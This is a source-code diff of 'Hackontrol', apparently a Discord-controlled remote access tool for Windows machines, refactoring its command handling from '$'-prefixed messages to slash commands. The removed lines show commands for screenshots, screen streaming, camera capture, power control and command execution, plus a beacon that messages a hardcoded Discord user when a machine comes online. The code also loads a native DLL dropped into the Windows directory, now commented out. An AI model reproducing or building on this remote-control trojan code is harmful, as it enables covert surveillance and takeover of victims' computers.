@@ -1,151 +1,84 @@
 package com.khopan.hackontrol;
 
 import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
+import java.util.Iterator;
+import java.util.LinkedHashMap;
+import java.util.Map;
+import java.util.Map.Entry;
 import java.util.Random;
 
-import com.khopan.hackontrol.command.CameraCommand;
-import com.khopan.hackontrol.command.Command;
-import com.khopan.hackontrol.command.CommandCommand;
-import com.khopan.hackontrol.command.DeviceListCommand;
-import com.khopan.hackontrol.command.DialogCommand;
-import com.khopan.hackontrol.command.HelpCommand;
-import com.khopan.hackontrol.command.MessageCommand;
-import com.khopan.hackontrol.command.NicknameCommand;
-import com.khopan.hackontrol.command.PowerCommand;
-import com.khopan.hackontrol.command.RickrollCommand;
-import com.khopan.hackontrol.command.ScreenshotCommand;
-import com.khopan.hackontrol.command.SelectCommand;
-import com.khopan.hackontrol.command.SoundCommand;
-import com.khopan.hackontrol.command.StreamCommand;
-import com.khopan.hackontrol.command.WakeCommand;
-import com.khopan.hackontrol.source.CommandSource;
-import com.khopan.hackontrol.source.DefaultCommandSource;
-import com.khopan.win32.Win32Library;
-import com.mojang.brigadier.CommandDispatcher;
-import com.mojang.brigadier.exceptions.CommandSyntaxException;
+import com.khopan.hackontrol.command.CommandManager;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
-import net.dv8tion.jda.api.entities.Message;
-import net.dv8tion.jda.api.entities.User;
-import net.dv8tion.jda.api.entities.channel.concrete.PrivateChannel;
-import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
-import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
-import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
+import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
+import net.dv8tion.jda.api.interactions.commands.Command;
+import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;
 import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
 	private static final String LIBRARY_NAME = "win32b.dll";
 
-	private final String machineIdentifier;
-	private final long userIdentifier;
-	private final CommandDispatcher<CommandSource> dispatcher;
-
-	private boolean selected;
-	private String nickname;
+	private final JDA bot;
+	private final Map<Command, com.khopan.hackontrol.command.Command> map;
 
 	private Hackontrol(JDA bot, String machineIdentifier) {
-		this.machineIdentifier = machineIdentifier;
-		bot.addEventListener(new Listener());
-		this.userIdentifier = bot.getSelfUser().getIdLong();
-		this.dispatcher = new CommandDispatcher<>();
-		this.registerCommand(new HelpCommand());
-		this.registerCommand(new DeviceListCommand());
-		this.registerCommand(new SelectCommand());
-		this.registerCommand(new ScreenshotCommand());
-		this.registerCommand(new StreamCommand());
-		this.registerCommand(new PowerCommand());
-		this.registerCommand(new CameraCommand());
-		this.registerCommand(new NicknameCommand());
-		this.registerCommand(new WakeCommand());
-		this.registerCommand(new CommandCommand());
-		this.registerCommand(new DialogCommand());
-		this.registerCommand(new SoundCommand());
-		this.registerCommand(new RickrollCommand());
-		this.registerCommand(new MessageCommand());
-		User user = bot.retrieveUserById(806469407454134282L).complete();
-
-		if(user != null) {
-			PrivateChannel channel = user.openPrivateChannel().complete();
-			String message = '`' + this.machineIdentifier + "` is online!";
-			channel.sendMessage(message).queue();
-		}
+		this.bot = bot;
+		this.map = new LinkedHashMap<>();
+		this.bot.addEventListener(new Listener());
+		CommandManager.register(this :: register);
 	}
 
-	private void registerCommand(Command command) {
-		command.register(this.dispatcher);
+	private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
+		if(commandClass == null) {
+			return;
+		}
+
+		com.khopan.hackontrol.command.Command command;
+
+		try {
+			command = commandClass.getConstructor().newInstance();
+		} catch(Throwable Errors) {
+			return;
+		}
+
+		SlashCommandData data = command.getCommand();
+		Command botCommand;
+
+		try {
+			botCommand = this.bot.upsertCommand(data).complete();
+		} catch(Throwable Errors) {
+			return;
+		}
+
+		this.map.put(botCommand, command);
 	}
 
-	private void processMessage(MessageReceivedEvent Event) {
-		if(Event.getAuthor().getIdLong() == this.userIdentifier) {
-			return;
-		}
+	private void onSlashCommand(SlashCommandInteractionEvent Event) {
+		long identifier = Event.getCommandIdLong();
+		Iterator<Entry<Command, com.khopan.hackontrol.command.Command>> iterator = this.map.entrySet().iterator();
 
-		MessageChannelUnion channel = Event.getChannel();
-		Message message = Event.getMessage();
-		String content = message.getContentDisplay();
+		while(iterator.hasNext()) {
+			Entry<Command, com.khopan.hackontrol.command.Command> entry = iterator.next();
+			Command key = entry.getKey();
+			com.khopan.hackontrol.command.Command value = entry.getValue();
 
-		if(content == null || content.isBlank()) {
-			return;
-		}
-
-		if(content.indexOf('\n') == -1) {
-			this.processSingleMessage(content, channel);
-			return;
-		}
-
-		String[] parts = content.split("\n");
-
-		if(parts == null || parts.length == 0) {
-			return;
-		}
-
-		for(int i = 0; i < parts.length; i++) {
-			String part = parts[i];
-
-			if(part == null || part.isBlank()) {
+			if(key.getIdLong() != identifier) {
 				continue;
 			}
 
-			this.processSingleMessage(part, channel);
-		}
-	}
-
-	private void processSingleMessage(String message, MessageChannel channel) {
-		message = message.trim();
-
-		if(!message.startsWith("$")) {
+			new Thread(() -> value.handleCommand(Event)).start();
 			return;
-		}
-
-		message = message.substring(1);
-
-		if(message.isBlank()) {
-			return;
-		}
-
-		CommandSource source = new DefaultCommandSource(this.machineIdentifier, channel, () -> this.selected, selected -> this.selected = selected, () -> this.nickname, nickname -> this.nickname = nickname);
-
-		try {
-			this.dispatcher.execute(message, source);
-		} catch(CommandSyntaxException Exception) {
-			if(!this.selected) {
-				return;
-			}
-
-			source.sendCodeMessage(Exception.getMessage());
 		}
 	}
 
 	public static void main(String[] args) throws Throwable {
-		String windowsDirectoryPath = System.getenv("windir");
+		/*String windowsDirectoryPath = System.getenv("windir");
 
 		if(windowsDirectoryPath == null) {
 			System.exit(1);
@@ -181,7 +114,7 @@ public class Hackontrol {
 
 		}
 
-		System.load(libraryFile.getAbsolutePath());
+		System.load(libraryFile.getAbsolutePath());*/
 		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.build();
@@ -305,8 +238,8 @@ public class Hackontrol {
 
 	private class Listener extends ListenerAdapter {
 		@Override
-		public void onMessageReceived(MessageReceivedEvent Event) {
-			new Thread(() -> Hackontrol.this.processMessage(Event)).start();
+		public void onSlashCommandInteraction(SlashCommandInteractionEvent Event) {
+			Hackontrol.this.onSlashCommand(Event);
 		}
 	}
 }
